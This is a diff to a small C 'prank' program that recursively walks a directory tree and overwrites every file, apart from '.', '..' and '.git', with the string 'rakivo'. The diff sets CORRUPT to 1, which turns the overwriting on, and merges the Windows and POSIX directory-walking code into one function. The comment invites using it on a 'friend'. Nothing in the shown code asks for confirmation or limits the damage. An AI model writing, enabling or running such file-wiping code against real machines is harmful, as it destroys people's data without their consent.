@@ -1,6 +1,6 @@
 #include "main.h"
 
-#define CORRUPT 0 // <- change this one to prank you "friend"
+#define CORRUPT 1 // <- change this one to prank you "friend"
 #define WRITE_WHAT "rakivo\n" // <- change this one to change the content that will be written
 
 const char* const IGNORED[IGNORED_CAP] = {".", "..", ".git"};
@@ -19,12 +19,14 @@ void write(const char* const file_name, FILE* file)
     fprintf(file, WRITE_WHAT);
 
     if (corrupted_files_counter == corrupted_files_curr_cap) {
-        corrupted_files = realloc(corrupted_files, (corrupted_files_curr_cap *= 1.5) * sizeof(char*));
+        corrupted_files = realloc(corrupted_files,
+                                 (corrupted_files_curr_cap *= 1.5) * sizeof(char*));
         if (!corrupted_files) {
             perror("Couldn't reallocate memory for corrupted_files");
             exit(1);
         }
     }
+
     corrupted_files[corrupted_files_counter] = malloc(strlen(file_name) + 1);
     if (!corrupted_files[corrupted_files_counter]) {
         perror("Couldn't allocate memory for corrupted file");
@@ -37,35 +39,22 @@ void write(const char* const file_name, FILE* file)
     fclose(file);
 }
 
-#ifdef _WIN32
 void corrupt(const char* const dir_path)
 {
+#ifdef _WIN32
     OPEN_DIR(hFind, findData, dir_path);
-    
+#else
+    OPEN_DIR(dp, ep, dir_path);
+#endif
+
+#ifdef _WIN32
     while(FindNextFile(hFind, &findData)) {
         const char* name = findData.cFileName;
-        if (isignored(name) == 0) continue;
-        
-        char path[PATH_CAP];
-        GET_PATH(path, dir_path, name);
-
-        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-            write(path, fopen(path, "w"));
-        } else {
-            corrupt(path);
-        }
-    }
-
-    FindClose(hFind);
-}
-
 #else
-void corrupt(const char* const dir_path)
-{
-    OPEN_DIR(dp, ep, dir_path);
-
     while ((ep = readdir(dp))) {
         const char* name = ep->d_name;
+#endif
+
         if (isignored(name) == 0) continue;
 
         char path[PATH_CAP];
@@ -78,12 +67,15 @@ void corrupt(const char* const dir_path)
         }
     }
 
+#ifdef _WIN32
+    FindClose(hFind);
+#else
     if (closedir(dp) != 0) {
         perror("Couldn't close the directory");
         exit(1);
     }
-}
 #endif
+}
 
 int main(const int argc, const char* const* const argv)
 {
